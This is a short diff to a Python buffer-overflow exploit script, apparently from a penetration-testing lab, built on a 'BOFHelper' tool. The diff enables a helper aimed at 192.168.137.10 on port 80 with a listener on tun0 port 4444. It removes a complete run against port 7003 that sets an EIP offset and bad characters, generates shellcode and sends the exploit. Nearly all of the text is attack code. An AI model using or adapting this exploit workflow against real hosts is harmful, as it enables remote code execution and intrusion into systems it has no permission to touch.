@@ -42,7 +42,7 @@ if __name__ == "__main__":
     cfPrefix = b"\x11(setup sound "
     cfSuffix = b"\x90\x00#"
 
-    # bof = BOFHelper('tun0', 4444, "192.168.137.10", 80, sbHeader, sbPrefix, sbSuffix, recv = True, debug=True)
+    bof = BOFHelper('tun0', 4444, "192.168.137.10", 80, sbHeader, sbPrefix, sbSuffix, recv=True, debug=True)
     # bof.set_esp_padding(4)
     # bof.set_eip_offset(780)
     # bof.set_bad_chars(["00", "0a", "0d", "25", "26", "2b", "3d"])
@@ -56,13 +56,3 @@ if __name__ == "__main__":
     # bof.expand_space()
     # bof.generate_file()
     # bof.send_exploit()
-
-    bof = BOFHelper('tun0', 4444, "192.168.137.10", 7003, recv=False, ask_crash=True, debug=True, strict=True)
-    bof.set_num_bytes(2200, True)
-    bof.set_esp_padding(0)
-    bof.set_eip_offset(2080)
-    bof.set_bad_chars(["00", "3b", "45"])
-    bof.generate_shellcode()
-    bof.expand_space()
-    bof.generate_file()
-    bof.send_exploit()
